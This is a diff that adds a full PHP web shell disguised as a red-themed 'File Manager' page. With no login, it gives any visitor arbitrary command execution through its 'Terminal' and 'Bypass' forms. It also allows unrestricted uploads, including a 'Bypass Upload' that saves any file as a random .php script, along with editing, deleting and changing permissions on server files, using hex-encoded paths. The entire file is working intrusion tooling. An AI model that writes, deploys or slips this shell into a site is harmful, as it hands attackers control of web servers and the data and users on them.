@@ -1,0 +1,438 @@
+<?php
+@set_time_limit(0);
+@ini_set('display_errors', 0);
+session_start();
+
+// Helper functions
+function hx($n) {
+    $y = '';
+    for ($i = 0; $i < strlen($n); $i++) {
+        $y .= dechex(ord($n[$i]));
+    }
+    return $y;
+}
+
+function unx($y) {
+    $n = '';
+    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
+    }
+    return $n;
+}
+
+function cmd($in) {
+    $out = '';
+    if (function_exists("exec")) {
+        exec($in, $out);
+        $out = implode("\n", $out);
+    } elseif (function_exists("shell_exec")) {
+        $out = shell_exec($in);
+    } elseif (function_exists("system")) {
+        ob_start();
+        system($in);
+        $out = ob_get_clean();
+    }
+    return $out ?: 'Command executed successfully';
+}
+
+function success() {
+    header('Location: ?d=' . hx(getcwd()) . '&response=success');
+    exit;
+}
+
+function failed() {
+    header('Location: ?d=' . hx(getcwd()) . '&response=failed');
+    exit;
+}
+
+// Handle directory change
+if (isset($_GET['d'])) {
+    $cdir = unx($_GET['d']);
+    chdir($cdir);
+}
+
+$current_path = getcwd();
+
+// Handle file operations
+if (isset($_GET['action'])) {
+    if ($_GET['action'] == 'delete' && isset($_GET['item'])) {
+        $item = unx($_GET['item']);
+        is_file($item) ? unlink($item) : rmdir($item);
+        success();
+    }
+}
+
+// Handle form submissions
+if (isset($_POST['submit'])) {
+    if (isset($_POST['create_folder'])) {
+        mkdir($_POST['create_folder']) ? success() : failed();
+    } elseif (isset($_POST['create_file'])) {
+        file_put_contents($_POST['create_file'], '') ? success() : failed();
+    } elseif (isset($_POST['rename_file']) && isset($_GET['re'])) {
+        rename(unx($_GET['re']), $_POST['rename_file']) ? success() : failed();
+    } elseif (isset($_POST['chmod_file']) && isset($_GET['ch'])) {
+        chmod(unx($_GET['ch']), octdec($_POST['chmod_file'])) ? success() : failed();
+    } elseif (isset($_POST['file_content']) && isset($_GET['edit'])) {
+        file_put_contents(unx($_GET['edit']), $_POST['file_content']) ? success() : failed();
+    }
+}
+
+// Handle uploads
+if (isset($_POST['upload-submit'])) {
+    $file = $_FILES['file-upload'];
+    move_uploaded_file($file['tmp_name'], $file['name']) ? success() : failed();
+}
+
+if (isset($_POST['bypass-submit'])) {
+    $file = $_FILES['bypass-upload'];
+    if (move_uploaded_file($file['tmp_name'], $file['name'])) {
+        $new_name = substr(md5(rand()), 0, 10) . '.php';
+        copy($file['name'], $new_name);
+        unlink($file['name']);
+        echo "<script>alert('File uploaded as: $new_name');</script>";
+    } else {
+        failed();
+    }
+}
+
+// Handle terminal commands
+if (isset($_POST['terminal'])) {
+    $command = $_POST['terminal-text'];
+    $output = cmd($command);
+    $_SESSION['terminal_history'] = isset($_SESSION['terminal_history']) ? $_SESSION['terminal_history'] : [];
+    $_SESSION['terminal_history'][] = ['command' => htmlspecialchars($command), 'output' => htmlspecialchars($output)];
+}
+
+if (isset($_POST['bypass-cmd'])) {
+    $command = $_POST['bypass-text'];
+    $output = cmd($command);
+    $_SESSION['bypass_history'] = isset($_SESSION['bypass_history']) ? $_SESSION['bypass_history'] : [];
+    $_SESSION['bypass_history'][] = ['command' => htmlspecialchars($command), 'output' => htmlspecialchars($output)];
+}
+
+$files = glob('*');
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        .file-item:hover { background: rgba(239, 68, 68, 0.1); }
+        .modal { background: rgba(0, 0, 0, 0.7); }
+        .terminal-output { white-space: pre-wrap; word-break: break-all; }
+    </style>
+</head>
+<body class="bg-red-950 text-white min-h-screen p-4">
+    <!-- Header -->
+    <div class="bg-red-900 rounded-lg p-4 mb-4">
+        <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
+            <div class="flex items-center">
+                <i class="fas fa-folder text-red-400 text-2xl mr-3"></i>
+                <div>
+                    <h1 class="text-xl font-bold">File Manager</h1>
+                    <p class="text-red-300 text-sm"><?= $current_path ?></p>
+                </div>
+            </div>
+            <div class="flex flex-wrap gap-2">
+                <button onclick="showModal('folder-modal')" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-sm">
+                    <i class="fas fa-folder-plus mr-1"></i>Folder
+                </button>
+                <button onclick="showModal('file-modal')" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-sm">
+                    <i class="fas fa-file-plus mr-1"></i>File
+                </button>
+                <button onclick="showModal('terminal-modal')" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-sm">
+                    <i class="fas fa-terminal mr-1"></i>Terminal
+                </button>
+                <button onclick="showModal('bypass-modal')" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-sm">
+                    <i class="fas fa-terminal mr-1"></i>Bypass
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Breadcrumb -->
+    <div class="bg-red-900 rounded-lg p-3 mb-4 text-sm">
+        <?php
+        $path = str_replace("\\", "/", $current_path);
+        $parts = explode("/", $path);
+        $currentPath = '';
+        
+        echo '<a href="?d=' . hx('/') . '" class="text-red-400 hover:text-red-300">
+                <i class="fas fa-home mr-1"></i>/
+              </a>';
+        
+        foreach ($parts as $part) {
+            if ($part === '') continue;
+            $currentPath .= '/' . $part;
+            echo '<span class="text-red-300 mx-2">/</span>';
+            echo '<a href="?d=' . hx($currentPath) . '" class="text-red-400 hover:text-red-300">' . $part . '</a>';
+        }
+        ?>
+    </div>
+
+    <!-- Upload Section -->
+    <div class="bg-red-900 rounded-lg p-4 mb-4">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+                <h3 class="font-semibold mb-2">Normal Upload</h3>
+                <form method="post" enctype="multipart/form-data" class="flex gap-2">
+                    <input type="file" name="file-upload" class="flex-1 bg-red-800 rounded px-3 py-2 text-sm" required>
+                    <button type="submit" name="upload-submit" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-sm">
+                        <i class="fas fa-upload mr-1"></i>Upload
+                    </button>
+                </form>
+            </div>
+            <div>
+                <h3 class="font-semibold mb-2">Bypass Upload</h3>
+                <form method="post" enctype="multipart/form-data" class="flex gap-2">
+                    <input type="file" name="bypass-upload" class="flex-1 bg-red-800 rounded px-3 py-2 text-sm" required>
+                    <button type="submit" name="bypass-submit" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-sm">
+                        <i class="fas fa-upload mr-1"></i>Upload
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- File List -->
+    <div class="bg-red-900 rounded-lg overflow-hidden">
+        <div class="bg-red-950 p-3 grid grid-cols-12 gap-2 text-sm font-semibold">
+            <div class="col-span-6">Name</div>
+            <div class="col-span-2 text-center">Size</div>
+            <div class="col-span-2 text-center">Perms</div>
+            <div class="col-span-2 text-center">Actions</div>
+        </div>
+        
+        <div class="max-h-96 overflow-y-auto">
+            <?php if ($current_path !== '/'): ?>
+            <div class="file-item p-3 grid grid-cols-12 gap-2 items-center border-b border-red-800">
+                <div class="col-span-6 flex items-center">
+                    <i class="fas fa-level-up-alt text-red-400 mr-2"></i>
+                    <a href="?d=<?= hx(dirname($current_path)) ?>" class="text-red-400 hover:text-red-300">
+                        .. (Parent)
+                    </a>
+                </div>
+                <div class="col-span-2 text-center text-red-300">DIR</div>
+                <div class="col-span-2 text-center text-red-300">drwxr-xr-x</div>
+                <div class="col-span-2 text-center"></div>
+            </div>
+            <?php endif; ?>
+
+            <?php foreach ($files as $item): 
+                $isDir = is_dir($item);
+                $fullPath = $current_path . '/' . $item;
+            ?>
+            <div class="file-item p-3 grid grid-cols-12 gap-2 items-center border-b border-red-800">
+                <div class="col-span-6 flex items-center">
+                    <i class="<?= $isDir ? 'fas fa-folder text-red-400' : 'fas fa-file text-red-400' ?> mr-2"></i>
+                    <?php if ($isDir): ?>
+                        <a href="?d=<?= hx($fullPath) ?>" class="text-red-400 hover:text-red-300">
+                            <?= htmlspecialchars($item) ?>
+                        </a>
+                    <?php else: ?>
+                        <span class="text-red-300"><?= htmlspecialchars($item) ?></span>
+                    <?php endif; ?>
+                </div>
+                
+                <div class="col-span-2 text-center text-red-300 text-sm">
+                    <?= $isDir ? 'DIR' : number_format(filesize($item)) ?>
+                </div>
+                
+                <div class="col-span-2 text-center text-red-300 text-sm">
+                    <?= substr(sprintf('%o', fileperms($item)), -4) ?>
+                </div>
+                
+                <div class="col-span-2 flex justify-center gap-2">
+                    <?php if ($isDir): ?>
+                        <a href="?d=<?= hx($fullPath) ?>" class="text-red-400 hover:text-red-300" title="Open">
+                            <i class="fas fa-folder-open"></i>
+                        </a>
+                        <a href="?d=<?= hx($current_path) ?>&re=<?= hx($item) ?>" class="text-red-400 hover:text-red-300" title="Rename">
+                            <i class="fas fa-edit"></i>
+                        </a>
+                    <?php else: ?>
+                        <a href="?d=<?= hx($current_path) ?>&edit=<?= hx($item) ?>" class="text-red-400 hover:text-red-300" title="Edit">
+                            <i class="fas fa-edit"></i>
+                        </a>
+                        <a href="?d=<?= hx($current_path) ?>&re=<?= hx($item) ?>" class="text-red-400 hover:text-red-300" title="Rename">
+                            <i class="fas fa-pen"></i>
+                        </a>
+                        <a href="?action=delete&item=<?= hx($item) ?>" class="text-red-400 hover:text-red-300" title="Delete" 
+                           onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">
+                            <i class="fas fa-trash"></i>
+                        </a>
+                    <?php endif; ?>
+                </div>
+            </div>
+            <?php endforeach; ?>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div id="folder-modal" class="modal fixed inset-0 hidden items-center justify-center z-50">
+        <div class="bg-red-900 rounded-lg p-6 w-96">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-lg font-bold">Create Folder</h3>
+                <button onclick="hideModal('folder-modal')" class="text-red-300 hover:text-white">&times;</button>
+            </div>
+            <form method="post">
+                <input type="text" name="create_folder" class="w-full bg-red-800 rounded px-3 py-2 mb-4" placeholder="Folder name" required>
+                <div class="flex justify-end gap-2">
+                    <button type="submit" name="submit" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded">Create</button>
+                    <button type="button" onclick="hideModal('folder-modal')" class="bg-red-800 hover:bg-red-700 px-4 py-2 rounded">Close</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="file-modal" class="modal fixed inset-0 hidden items-center justify-center z-50">
+        <div class="bg-red-900 rounded-lg p-6 w-96">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-lg font-bold">Create File</h3>
+                <button onclick="hideModal('file-modal')" class="text-red-300 hover:text-white">&times;</button>
+            </div>
+            <form method="post">
+                <input type="text" name="create_file" class="w-full bg-red-800 rounded px-3 py-2 mb-4" placeholder="File name" required>
+                <div class="flex justify-end gap-2">
+                    <button type="submit" name="submit" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded">Create</button>
+                    <button type="button" onclick="hideModal('file-modal')" class="bg-red-800 hover:bg-red-700 px-4 py-2 rounded">Close</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="terminal-modal" class="modal fixed inset-0 hidden items-center justify-center z-50">
+        <div class="bg-red-900 rounded-lg w-full max-w-4xl h-[80vh] flex flex-col">
+            <div class="flex justify-between items-center p-4 border-b border-red-800">
+                <h3 class="text-lg font-bold">Terminal</h3>
+                <button onclick="hideModal('terminal-modal')" class="text-red-300 hover:text-white">&times;</button>
+            </div>
+            <div class="flex-1 overflow-auto p-4 bg-black text-red-300 font-mono text-sm terminal-output">
+                <?php
+                if (isset($_SESSION['terminal_history']) && is_array($_SESSION['terminal_history'])) {
+                    foreach ($_SESSION['terminal_history'] as $entry) {
+                        echo "<div class='mb-2'>$ <span class='text-red-400'>{$entry['command']}</span></div>";
+                        echo "<div class='mb-4'>{$entry['output']}</div>";
+                    }
+                }
+                ?>
+            </div>
+            <form method="post" class="p-4 border-t border-red-800 flex">
+                <input type="text" name="terminal-text" class="flex-1 bg-black text-red-300 rounded-l px-3 py-2 font-mono" 
+                       placeholder="<?= get_current_user() ?>@<?= $_SERVER['HTTP_HOST'] ?>" autofocus>
+                <button type="submit" name="terminal" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-r">Run</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="bypass-modal" class="modal fixed inset-0 hidden items-center justify-center z-50">
+        <div class="bg-red-900 rounded-lg w-full max-w-4xl h-[80vh] flex flex-col">
+            <div class="flex justify-between items-center p-4 border-b border-red-800">
+                <h3 class="text-lg font-bold">Terminal Bypass</h3>
+                <button onclick="hideModal('bypass-modal')" class="text-red-300 hover:text-white">&times;</button>
+            </div>
+            <div class="flex-1 overflow-auto p-4 bg-black text-red-300 font-mono text-sm terminal-output">
+                <?php
+                if (isset($_SESSION['bypass_history']) && is_array($_SESSION['bypass_history'])) {
+                    foreach ($_SESSION['bypass_history'] as $entry) {
+                        echo "<div class='mb-2'>$ <span class='text-red-400'>{$entry['command']}</span></div>";
+                        echo "<div class='mb-4'>{$entry['output']}</div>";
+                    }
+                }
+                ?>
+            </div>
+            <form method="post" class="p-4 border-t border-red-800 flex">
+                <input type="text" name="bypass-text" class="flex-1 bg-black text-red-300 rounded-l px-3 py-2 font-mono" 
+                       placeholder="Bypass command..." autofocus>
+                <button type="submit" name="bypass-cmd" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-r">Run</button>
+            </form>
+        </div>
+    </div>
+
+    <?php if (isset($_GET['re'])): ?>
+    <div id="rename-modal" class="modal fixed inset-0 flex items-center justify-center z-50">
+        <div class="bg-red-900 rounded-lg p-6 w-96">
+            <div class="flex justify-between items-center mb-4">
+                <h3 class="text-lg font-bold">Rename</h3>
+                <a href="?d=<?= hx($current_path) ?>" class="text-red-300 hover:text-white">&times;</a>
+            </div>
+            <form method="post">
+                <input type="text" name="rename_file" class="w-full bg-red-800 rounded px-3 py-2 mb-4" 
+                       value="<?= htmlspecialchars(unx($_GET['re'])) ?>" required>
+                <div class="flex justify-end gap-2">
+                    <button type="submit" name="submit" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded">Rename</button>
+                    <a href="?d=<?= hx($current_path) ?>" class="bg-red-800 hover:bg-red-700 px-4 py-2 rounded">Close</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <?php endif; ?>
+
+    <?php if (isset($_GET['edit'])): ?>
+    <div id="edit-modal" class="modal fixed inset-0 flex items-center justify-center z-50">
+        <div class="bg-red-900 rounded-lg w-full max-w-6xl h-[80vh] flex flex-col">
+            <div class="flex justify-between items-center p-4 border-b border-red-800">
+                <h3 class="text-lg font-bold">Edit: <?= htmlspecialchars(unx($_GET['edit'])) ?></h3>
+                <a href="?d=<?= hx($current_path) ?>" class="text-red-300 hover:text-white">&times;</a>
+            </div>
+            <form method="post" class="flex-1 flex flex-col">
+                <textarea name="file_content" class="flex-1 bg-red-950 text-white p-4 font-mono text-sm resize-none"><?= 
+                    htmlspecialchars(file_get_contents(unx($_GET['edit']))) 
+                ?></textarea>
+                <div class="flex justify-end p-4 border-t border-red-800 gap-2">
+                    <button type="submit" name="submit" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded">Save</button>
+                    <a href="?d=<?= hx($current_path) ?>" class="bg-red-800 hover:bg-red-700 px-4 py-2 rounded">Close</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <?php endif; ?>
+
+    <script>
+        function showModal(id) {
+            document.getElementById(id).classList.remove('hidden');
+            document.getElementById(id).classList.add('flex');
+            const input = document.getElementById(id).querySelector('input');
+            if (input) input.focus();
+            // Scroll to bottom of terminal output
+            const terminalOutput = document.getElementById(id).querySelector('.terminal-output');
+            if (terminalOutput) terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+
+        function hideModal(id) {
+            document.getElementById(id).classList.add('hidden');
+            document.getElementById(id).classList.remove('flex');
+        }
+
+        // Auto focus terminal input and keep modal open
+        document.addEventListener('DOMContentLoaded', function() {
+            <?php if (isset($_POST['terminal'])): ?>
+                showModal('terminal-modal');
+            <?php endif; ?>
+            <?php if (isset($_POST['bypass-cmd'])): ?>
+                showModal('bypass-modal');
+            <?php endif; ?>
+        });
+
+        // Handle Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                document.querySelectorAll('.modal').forEach(modal => {
+                    modal.classList.add('hidden');
+                    modal.classList.remove('flex');
+                });
+            }
+        });
+
+        <?php if (isset($_GET['response'])): ?>
+            setTimeout(() => {
+                alert('<?= $_GET['response'] === 'success' ? 'Operation successful!' : 'Operation failed!' ?>');
+            }, 100);
+        <?php endif; ?>
+    </script>
+</body>
+</html>
